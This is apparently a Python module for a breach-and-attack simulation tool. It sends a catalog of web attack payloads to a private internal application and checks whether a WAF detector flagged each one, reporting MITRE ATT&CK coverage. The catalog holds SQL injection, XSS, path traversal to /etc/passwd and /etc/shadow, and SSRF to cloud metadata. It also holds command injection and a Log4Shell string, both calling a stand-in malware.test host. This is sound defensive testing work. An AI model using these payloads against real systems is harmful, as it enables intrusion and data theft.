"""FlyBAS — муха-розвідник: безпечна симуляція атак для перевірки виявлення.

Замкнене коло: FlyBAS шле серію тестових атак на ВАШ внутрішній застосунок (за WAF),
а FlyGuard має їх помітити. Результат — табель «надіслано / виявлено» і покриття за MITRE ATT&CK.

Безпека — жорстко:
  * ціль має резолвитися у приватну мережу з allow_nets; зовнішні адреси відхиляються;
  * запити лише тестові (payload-и, які має ловити WAF), без реальних деструктивних дій;
  * запуск лише вручну з веб-інтерфейсу; кожен запуск у журналі.
Це симуляція для перевірки захисту, а не інструмент зламу.
"""
from __future__ import annotations

import ipaddress
import socket
import ssl
import threading
import time
import urllib.error
import urllib.request
from urllib.parse import urlsplit

# Кожен тест: id, назва, техніка MITRE, метод, шлях із payload. Маркер fb=<token> додається автоматично.
TESTS = [
    ("sqli-union", "SQL Injection (UNION)", "T1190", "GET", "/search?q=x' UNION SELECT username,password FROM users--"),
    ("sqli-bool", "SQL Injection (boolean)", "T1190", "GET", "/item?id=1' OR '1'='1"),
    ("sqli-sleep", "SQL Injection (time-based)", "T1190", "GET", "/item?id=1;WAITFOR DELAY '0:0:5'--"),
    ("xss-script", "Cross-Site Scripting", "T1059", "GET", "/search?q=<script>alert(1)</script>"),
    ("xss-img", "XSS (img onerror)", "T1059", "GET", "/p?ref=\"><img src=x onerror=alert(1)>"),
    ("trav-passwd", "Path Traversal (/etc/passwd)", "T1083", "GET", "/static/../../../../etc/passwd"),
    ("trav-enc", "Path Traversal (encoded)", "T1083", "GET", "/img/..%2f..%2f..%2fetc%2fshadow"),
    ("cmd-id", "Command Injection", "T1059", "GET", "/ping?host=127.0.0.1;cat /etc/passwd"),
    ("cmd-wget", "Command Injection (download)", "T1059", "GET", "/ping?host=8.8.8.8 && wget http://malware.test/x.sh"),
    ("lfi-env", "Sensitive File (.env)", "T1083", "GET", "/.env"),
    ("lfi-git", "Sensitive File (.git)", "T1083", "GET", "/.git/config"),
    ("scan-admin", "Admin Panel Probe", "T1595", "GET", "/wp-admin/install.php"),
    ("scan-tool", "Scanner User-Agent", "T1595", "GET", "/robots.txt"),  # маркер у UA
    ("log4j", "Log4Shell probe", "T1190", "GET", "/?x=${jndi:ldap://malware.test/a}"),
    ("ssrf", "SSRF (metadata)", "T1190", "GET", "/fetch?url=http://169.254.169.254/latest/meta-data/"),
]

SCANNER_UA = "sqlmap/1.8 (flybas-test)"


def resolve_private(target: str, allow_nets: list[str]) -> tuple[bool, str]:
    """Перевіряє, що ціль у дозволених приватних мережах."""
    host = urlsplit(target if "://" in target else "http://" + target).hostname or ""
    try:
        ip = socket.gethostbyname(host)
    except OSError as e:
        return False, f"не вдалося визначити IP для {host}: {e}"
    try:
        addr = ipaddress.ip_address(ip)
    except ValueError:
        return False, f"невірний IP: {ip}"
    nets = [ipaddress.ip_network(n, strict=False) for n in allow_nets]
    if not any(addr in n for n in nets):
        return False, f"ціль {host} ({ip}) поза дозволеними мережами — відхилено з міркувань безпеки"
    if not (addr.is_private or addr.is_loopback):
        return False, f"ціль {ip} не приватна — відхилено"
    return True, ip


class BasRunner:
    def __init__(self, store, alert_lookup):
        """alert_lookup() -> список останніх алертів (кожен dict з 'url' і 'time')."""
        self.store = store
        self.alert_lookup = alert_lookup
        self.lock = threading.RLock()
        self.running = False
        self.result: dict | None = None
        self.progress = ""

    def run_async(self, target: str | None = None) -> dict:
        with self.lock:
            if self.running:
                return {"error": "симуляція вже триває"}
            cfg = self.store.get("bas")
            target = target or cfg.get("target", "")
            if not target:
                return {"error": "не задано ціль (внутрішня адреса застосунку за WAF)"}
            ok, info = resolve_private(target, cfg.get("allow_nets", []))
            if not ok:
                return {"error": info}
            self.running, self.progress, self.result = True, "починаю…", None
        threading.Thread(target=self._job, args=(target,), daemon=True).start()
        return {"ok": True, "message": f"симуляцію запущено проти {target}"}

    def _job(self, target: str):
        try:
            self._run(target)
        except Exception as e:                      # тест-інструмент не має падати мовчки
            with self.lock:
                self.result = {"error": f"симуляція перервана: {e}"}
        finally:
            with self.lock:
                self.running = False
                self.progress = ""

    def _run(self, target: str):
        base = target.rstrip("/")
        if "://" not in base:
            base = "https://" + base
        token = f"fb{int(time.time())}"
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        sent = []
        for i, (tid, name, tech, method, path) in enumerate(TESTS, 1):
            self.progress = f"{i}/{len(TESTS)}: {name}"
            sep = "&" if "?" in path else "?"
            url = (f"{base}{path}{sep}fb={token}_{tid}").replace(" ", "%20").replace('"', "%22")
            ua = SCANNER_UA if tid == "scan-tool" else f"Mozilla/5.0 (FlyBAS test {token})"
            code = 0
            try:
                req = urllib.request.Request(url, method=method, headers={"User-Agent": ua, "X-FlyBAS": token})
                with urllib.request.urlopen(req, timeout=6, context=ctx if base.startswith("https") else None) as r:
                    code = r.status
            except urllib.error.HTTPError as e:
                code = e.code
            except Exception:           # будь-яка мережева/URL помилка — тест просто не доставлено
                code = 0
            sent.append({"id": tid, "name": name, "technique": tech, "url": path, "http_code": code})
            time.sleep(0.4)

        # дати логам пройти ланцюг WAF -> syslog -> FlyGuard
        self.progress = "чекаю на реакцію FlyGuard…"
        time.sleep(12)
        alerts = self.alert_lookup() or []
        alert_urls = " ".join(a.get("url", "") for a in alerts)
        detected = 0
        for t in sent:
            marker = f"fb={token}_{t['id']}"
            t["detected"] = marker in alert_urls
            detected += t["detected"]

        by_tech: dict[str, dict] = {}
        for t in sent:
            d = by_tech.setdefault(t["technique"], {"total": 0, "detected": 0})
            d["total"] += 1
            d["detected"] += t["detected"]

        res = {"target": target, "token": token, "ts": time.strftime("%Y-%m-%d %H:%M:%S"),
               "sent": len(sent), "detected": detected,
               "score": round(detected / max(len(sent), 1) * 100),
               "tests": sent, "mitre": by_tech,
               "note": "Виявлення залежить від того, чи ввімкнені логи WAF і навчена модель."}
        with self.lock:
            self.result = res
            self.running = False
            self.progress = ""
        self.store.update("bas", {"last_run": {"ts": res["ts"], "score": res["score"],
                                               "sent": res["sent"], "detected": res["detected"]}})

    def snapshot(self) -> dict:
        with self.lock:
            cfg = self.store.get("bas")
            return {"running": self.running, "progress": self.progress, "result": self.result,
                    "target": cfg.get("target", ""), "allow_nets": cfg.get("allow_nets", []),
                    "last_run": cfg.get("last_run"), "catalog": [{"name": n, "technique": t}
                                                                 for _, n, t, _, _ in TESTS]}
